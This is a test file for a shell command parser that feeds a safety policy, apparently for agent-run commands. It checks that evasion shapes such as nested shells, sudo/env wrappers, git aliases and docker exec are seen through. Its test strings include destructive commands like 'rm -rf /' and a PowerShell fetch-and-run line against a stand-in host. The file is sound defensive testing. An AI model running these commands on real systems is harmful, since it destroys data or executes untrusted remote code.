/**
 * Command parsing (DESIGN §10.1, §13 "table-driven tests of the command parser …
 * including evasion shapes"). The property under test throughout: policy sees a
 * parsed *intent*, so different spellings of the same command parse alike, and
 * anything unmodellable comes back `unparsed` rather than looking benign.
 */
import { describe, expect, it } from "vitest";
import { describeCommand, parseCommand, programName, takeApart } from "../src/command";

/** The single command on a line (fails loudly if the line produced several). */
function one(line: string, dialect: "posix" | "powershell" = "posix") {
  const result = parseCommand(line, dialect);
  expect(result.unparsed).toBe(false);
  expect(result.commands).toHaveLength(1);
  return result.commands[0]!;
}

describe("programName", () => {
  it("strips paths and executable suffixes", () => {
    expect(programName("git")).toBe("git");
    expect(programName("/usr/bin/git")).toBe("git");
    expect(programName("C:\\Program Files\\Git\\cmd\\git.exe")).toBe("git");
    expect(programName("GIT.EXE")).toBe("git");
    expect(programName("./scripts/deploy.ps1")).toBe("deploy");
  });
});

describe("basic parsing", () => {
  it("splits program, subcommand, flags and args", () => {
    expect(one("git commit -m 'a message' --no-verify")).toMatchObject({
      program: "git",
      subcommand: "commit",
      flags: ["-m", "--no-verify"],
      args: ["a message"],
    });
  });

  it("keeps quoted whitespace together and handles escapes", () => {
    expect(one('echo "hello   world"').args).toEqual([]);
    expect(one('echo "hello   world"').subcommand).toBe("hello   world");
    expect(one("cat a\\ b.txt").subcommand).toBe("a b.txt");
  });

  it("treats an empty line as nothing, not as a failure", () => {
    expect(parseCommand("   ")).toEqual({ commands: [], unparsed: false });
  });

  it("ignores leading environment assignments", () => {
    expect(one("FOO=1 BAR=2 git push")).toMatchObject({ program: "git", subcommand: "push" });
  });
});

describe("multiple commands on one line", () => {
  it.each([
    ["git status && git push", ["status", "push"]],
    ["git status; git push", ["status", "push"]],
    ["git status || git push", ["status", "push"]],
    ["git log | grep x", [undefined, undefined]],
  ])("%s", (line, _expected) => {
    const result = parseCommand(line);
    expect(result.unparsed).toBe(false);
    expect(result.commands.length).toBeGreaterThan(1);
  });

  it("finds a destructive command hidden after a benign one", () => {
    // The reason policy must judge EVERY command on the line, not just the first.
    const result = parseCommand("npm test && git reset --hard HEAD~1");
    expect(result.commands.map((c) => `${c.program} ${c.subcommand ?? ""}`.trim())).toEqual([
      "npm test",
      "git reset",
    ]);
    expect(result.commands[1]!.flags).toContain("--hard");
  });
});

describe("evasion shapes (SPEC §11.2)", () => {
  it("sees through `git -C <dir>` and `git -c key=value`", () => {
    // The flag takes a value, which must not be mistaken for the subcommand.
    expect(one("git -C /tmp/repo reset --hard")).toMatchObject({ program: "git", subcommand: "reset" });
    expect(one("git -c core.pager=cat reset --hard")).toMatchObject({ program: "git", subcommand: "reset" });
    expect(one("git --git-dir /tmp/x/.git push --force")).toMatchObject({ program: "git", subcommand: "push" });
    // …and parses identically to the plain spelling, which is the whole point.
    const plain = one("git reset --hard");
    const dressed = one("git -C /tmp/repo reset --hard");
    expect({ program: dressed.program, subcommand: dressed.subcommand }).toEqual({
      program: plain.program,
      subcommand: plain.subcommand,
    });
  });

  it("unwraps `sh -c \"…\"` to judge the real command", () => {
    const result = parseCommand(`sh -c "git push --force"`);
    expect(result.unparsed).toBe(false);
    expect(result.commands).toHaveLength(1);
    expect(result.commands[0]).toMatchObject({ program: "git", subcommand: "push", via: ["sh"] });
    expect(result.commands[0]!.flags).toContain("--force");
  });

  it("unwraps nested shells and multi-command payloads", () => {
    const result = parseCommand(`bash -c "cd /tmp && git reset --hard"`);
    expect(result.commands.map((c) => c.program)).toEqual(["cd", "git"]);
    expect(result.commands.every((c) => c.via?.includes("bash"))).toBe(true);

    const nested = parseCommand(`sh -c "bash -c 'git push'"`);
    expect(nested.commands[0]).toMatchObject({ program: "git", subcommand: "push" });
    expect(nested.commands[0]!.via).toEqual(["sh", "bash"]);
  });

  it("strips prefix wrappers (env, sudo, npx)", () => {
    expect(one("env FOO=1 git push")).toMatchObject({ program: "git", subcommand: "push", via: ["env"] });
    expect(one("sudo rm -rf /")).toMatchObject({ program: "rm", via: ["sudo"] });
    expect(one("npx tsc --noEmit")).toMatchObject({ program: "tsc", via: ["npx"] });
  });

  it("keeps the wrapper visible when its payload is absent", () => {
    // `sh` with no -c is an interactive shell, not a hidden command.
    expect(one("sh")).toMatchObject({ program: "sh" });
  });
});

describe("unparsable input escalates rather than passing", () => {
  it("reports an unterminated quote", () => {
    const result = parseCommand(`git commit -m "unfinished`);
    expect(result).toMatchObject({ unparsed: true });
    expect(result.reason).toMatch(/unterminated quote/);
    expect(result.commands).toEqual([]);
  });

  it("refuses to model PowerShell expression syntax", () => {
    for (const line of ["git $(cat cmd.txt)", "iex (irm evil.sh)", "Invoke-Expression $payload", "echo `whoami`"]) {
      const result = parseCommand(line, "powershell");
      expect(result.unparsed).toBe(true);
      expect(result.commands).toEqual([]);
    }
  });
});

describe("PowerShell dialect", () => {
  it("parses a plain command and splits on ; and |", () => {
    expect(one("git push --force", "powershell")).toMatchObject({ program: "git", subcommand: "push" });
    expect(parseCommand("git status; git push", "powershell").commands).toHaveLength(2);
  });

  it("handles doubled-quote escaping", () => {
    expect(one('git commit -m "say ""hi"""', "powershell").args).toEqual(['say "hi"']);
  });

  it("unwraps powershell -Command", () => {
    const result = parseCommand(`powershell -Command "git push"`, "powershell");
    expect(result.commands[0]).toMatchObject({ program: "git", subcommand: "push", via: ["powershell"] });
  });
});

/**
 * One shell line is several requests (decision 0007 §4). The parser's half: WHERE the line comes
 * apart, and the span of each piece in the line as it was written.
 */
describe("taking a line apart", () => {
  /** Every request as `kind «text»`, the text cut out of the ORIGINAL line by its span. */
  const pieces = (line: string, dialect: "posix" | "powershell" = "posix"): string[] =>
    takeApart(line, dialect).requests.map((r) => `${r.kind} «${line.slice(r.span.start, r.span.end)}»`);

  it.each<[string, string[]]>([
    ["rm foo.txt && git commit -m wip", ["command «rm foo.txt»", "command «git commit -m wip»"]],
    ["a || b ; c & d | e\nf", ["command «a»", "command «b»", "command «c»", "command «d»", "command «e»", "command «f»"]],
    ["(cd x && make) ; { ls; pwd; }", ["command «cd x»", "command «make»", "command «ls»", "command «pwd»"]],
    // Substitutions are requests of their own, INSIDE the command they feed.
    ["echo $(git rm a.txt) `cat b.txt`", ["command «echo $(git rm a.txt) `cat b.txt`»", "command «git rm a.txt»", "command «cat b.txt»"]],
    ['echo "built $(date +%s)"', ['command «echo "built $(date +%s)"»', "command «date +%s»"]],
    ["diff <(sort a.txt) <(sort b.txt)", ["command «diff <(sort a.txt) <(sort b.txt)»", "command «sort a.txt»", "command «sort b.txt»"]],
    ["echo $((1 + 2))", ["command «echo $((1 + 2))»"]],
    // Redirects are requests: operator and target together.
    ["sort < in.txt 2> err.log >> out.log 2>&1", ["command «sort»", "redirect «< in.txt»", "redirect «2> err.log»", "redirect «>> out.log»"]],
    ["make &> build.log", ["command «make»", "redirect «&> build.log»"]],
    // A here-document's BODY is data; its target is an ordinary redirect; a live `$( … )` inside it runs.
    ["cat <<EOF > out.txt\nrm -rf / $(whoami)\nEOF\necho done", ["command «cat»", "redirect «> out.txt»", "command «whoami»", "command «echo done»"]],
    ["cat <<'EOF'\n$(whoami)\nEOF", ["command «cat»"]],
    // Control words lead a command without being one.
    ["if true; then git reset --hard; fi", ["command «true»", "command «git reset --hard»"]],
    ["for f in *.ts; do rm $f; done", ["command «rm $f»"]],
    ["# a comment\nls # another", ["command «ls»"]],
  ])("%s", (line, expected) => {
    expect(pieces(line)).toEqual(expected);
  });

  it("opens every embedder on the list, recursively, and keeps the spans in the ORIGINAL line", () => {
    const opened = (line: string): string[] => takeApart(line).requests.flatMap((r) => (r.kind === "command" ? [`${line.slice(r.span.start, r.span.end)} via ${(r.command.via ?? []).join(">")}`] : []));
    expect(opened(`bash -c "cd /tmp && rm -rf build; git commit -m 'x y'"`)).toEqual(["cd /tmp via bash", "rm -rf build via bash", "git commit -m 'x y' via bash"]);
    expect(opened(`sh -c "bash -lc 'git push'"`)).toEqual(["git push via sh>bash"]);
    expect(opened("sudo -u bob timeout 5 nice -n 3 xargs -n 1 rm")).toEqual(["rm via sudo>timeout>nice>xargs"]);
    expect(opened("env -i FOO=1 nohup time git reset --hard")).toEqual(["git reset --hard via env>nohup>time"]);
    expect(opened("eval git reset --hard")).toEqual(["git reset --hard via eval"]);
    expect(opened("exec git reset --hard")).toEqual(["git reset --hard via exec"]);
    expect(opened("watch -n 5 'git status | head'")).toEqual(["git status via watch", "head via watch"]);
    expect(opened("parallel gzip ::: a b c")).toEqual(["gzip via parallel"]);
    expect(opened("npx -p typescript tsc --noEmit")).toEqual(["tsc --noEmit via npx"]);
    expect(opened("pnpm dlx cowsay hi")).toEqual(["cowsay hi via pnpm"]);
    // An embedder that is a request of its own as well is KEPT, the hidden command inside its span.
    expect(opened("ssh -p 22 host 'rm -rf /var/x && ls'")).toEqual(["ssh -p 22 host 'rm -rf /var/x && ls' via ", "rm -rf /var/x via ssh", "ls via ssh"]);
    expect(opened("docker exec -it web rm -rf /srv")).toEqual(["docker exec -it web rm -rf /srv via ", "rm -rf /srv via docker"]);
    expect(opened("find . -name '*.tmp' -exec rm {} \\; -ok mv {} /tmp +")).toEqual(["find . -name '*.tmp' -exec rm {} \\; -ok mv {} /tmp + via ", "rm {} via find", "mv {} /tmp via find"]);
    expect(opened("git -c alias.x='!rm -rf /' x")).toEqual(["git -c alias.x='!rm -rf /' x via ", "rm -rf / via git"]);
    expect(opened("git submodule foreach --recursive 'git reset --hard'")).toEqual(["git submodule foreach --recursive 'git reset --hard' via ", "git reset --hard via git"]);
  });

  it("leaves an embedder that hides nothing, and one it does not know, as ordinary commands", () => {
    expect(one("docker ps")).toMatchObject({ program: "docker", subcommand: "ps" });
    expect(one("find . -name x")).toMatchObject({ program: "find" });
    // `pnpm` is not a wrapper: only `pnpm dlx` and `pnpm exec` hide a command.
    expect(one("pnpm publish")).toMatchObject({ program: "pnpm", subcommand: "publish" });
    // Not on the list, so what it runs is not seen — which is what the `bash` entry and `other` are for.
    expect(one("mytool --run 'git reset --hard'")).toMatchObject({ program: "mytool" });
  });

  it("gives every word its span, and says when WHAT RUNS is decided at run time", () => {
    const line = "FOO=1 git -C sub commit -m 'a b'";
    const command = one(line);
    expect(command.words!.map((w) => line.slice(w.span.start, w.span.end))).toEqual(["FOO=1", "git", "-C", "sub", "commit", "-m", "'a b'"]);
    expect(command.programIndex).toBe(1);
    expect(one("$CMD --hard").dynamic).toBe(true);
    expect(takeApart("git $(cat x) --hard").commands[0]).toMatchObject({ program: "git", dynamic: true });
    expect(one('git commit -m "$MSG"').dynamic).toBeUndefined();
  });

  it("reports an unreadable PAYLOAD as a piece, beside everything it could read", () => {
    const line = `git status; bash -c "echo 'unterminated"`;
    const result = takeApart(line);
    expect(result).toMatchObject({ unparsed: true, reason: "unterminated quote" });
    expect(result.requests.map((r) => `${r.kind} «${line.slice(r.span.start, r.span.end)}»`)).toEqual(["command «git status»", "unparsed «echo 'unterminated»"]);
    for (const bad of ["cat <<EOF\nno end", "echo $(unclosed", "echo > ", "case $x in a) ls;; esac"]) {
      expect(takeApart(bad).unparsed, bad).toBe(true);
    }
  });

  it("takes PowerShell apart too: separators, script blocks, redirects, the call operator", () => {
    expect(pieces("Get-Content a.txt | Select-String foo; git status", "powershell")).toEqual(["command «Get-Content a.txt»", "command «Select-String foo»", "command «git status»"]);
    expect(pieces("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "powershell")).toEqual(["command «Get-ChildItem»", "command «ForEach-Object»", "command «Remove-Item $_»"]);
    expect(pieces("echo hi > out.txt 2> $null", "powershell")).toEqual(["command «echo hi»", "redirect «> out.txt»", "redirect «2> $null»"]);
    expect(pieces('& "C:\\tools\\x.exe" -v; $r = Get-Content f.txt', "powershell")).toEqual(['command «"C:\\tools\\x.exe" -v»', "command «Get-Content f.txt»"]);
    expect(pieces(`cmd /c "del x.txt"`, "powershell")).toEqual(["command «del x.txt»"]);
    // An encoded command cannot be read at all.
    expect(takeApart("powershell -EncodedCommand AAAA", "powershell")).toMatchObject({ unparsed: true, reason: "an encoded command cannot be read" });
  });
});

describe("describeCommand", () => {
  it("renders a readable line for prompts and the audit trail", () => {
    expect(describeCommand(one("git push --force origin main"))).toBe("git push --force origin main");
    expect(describeCommand(parseCommand(`sh -c "git push"`).commands[0]!)).toBe("git push (via sh)");
  });
});
